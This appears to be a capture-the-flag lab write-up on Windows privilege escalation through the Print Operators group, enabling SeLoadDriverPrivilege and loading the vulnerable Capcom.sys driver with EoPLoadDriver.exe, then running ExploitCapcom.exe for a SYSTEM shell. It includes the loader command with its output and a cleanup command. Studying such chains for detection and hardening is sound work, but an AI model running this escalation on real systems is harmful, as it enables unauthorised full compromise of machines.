# Print Operators Challenge

## Overview
This challenge explores privilege escalation in Windows through the **Print Operators** group and the **SeLoadDriverPrivilege** privilege.

Members of the Print Operators group can:
- Manage printers connected to domain controllers  
- Log on locally and shut down a domain controller  
- **Load and unload device drivers**, which can allow kernel-level (SYSTEM) code execution

---

##  Context
The `SeLoadDriverPrivilege` privilege allows a user to load kernel-mode drivers.  
If a user can enable this privilege and load a **vulnerable driver**, they can execute code with **NT AUTHORITY\SYSTEM** permissions.

---



##  Step 1 — Gaining an Elevated Command Shell
Using a **UAC-bypassed** Command Prompt to start an administrative session:
<img width="1177" height="725" alt="image" src="https://github.com/user-attachments/assets/ef4ab4a9-ccac-4f46-a3cb-627d591071af" />


##  Step 2 — Enabling the Privilege and Loading the Driver
Use **EoPLoadDriver.exe** to automate:
1. Enabling `SeLoadDriverPrivilege`
2. Creating the required registry key
3. Executing `NTLoadDriver` to load the vulnerable driver

```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Tools

C:\Tools>EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
RegCreateKeyEx failed: 0x0
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: 00000000, WinError: 0

```

##  Step 3 — Exploiting the Vulnerable Driver
Run ExploitCapcom.exe, which communicates with the loaded driver and executes shellcode that steals a SYSTEM token.

<img width="1238" height="647" alt="image" src="https://github.com/user-attachments/assets/4b423556-bfc1-4c33-9d56-ecf62f276d87" />

When executed, it launches a new Command Prompt with NT AUTHORITY\SYSTEM privileges, allowing to read the contents of the flag.

<img width="1234" height="652" alt="image" src="https://github.com/user-attachments/assets/798064e9-a754-4f3d-95e5-01e755d5b27c" />

## Understanding the Exploit Chain

| Step | Description                                  |
| ---- | -------------------------------------------- |
| 1  | Become a member of **Print Operators**       |
| 2️  | Enable **SeLoadDriverPrivilege**             |
| 3️ | Load a vulnerable driver (`Capcom.sys`)      |
| 4️  | Exploit the driver to run code as **SYSTEM** |
| 5️  | Gain full control of the system              |

## Clean-Up and Mitigations

Remove the registry key created during testing:

```
reg delete HKCU\System\CurrentControlSet\Capcom
```

## Summary

This exercise demonstrates how legacy privileges like SeLoadDriverPrivilege can lead to full system compromise when combined with a vulnerable driver.
While patched in modern Windows versions, understanding this chain is valuable for:

- Learning Windows privilege architecture

- Practicing detection of driver-based escalations

- Strengthening defensive hardening policies




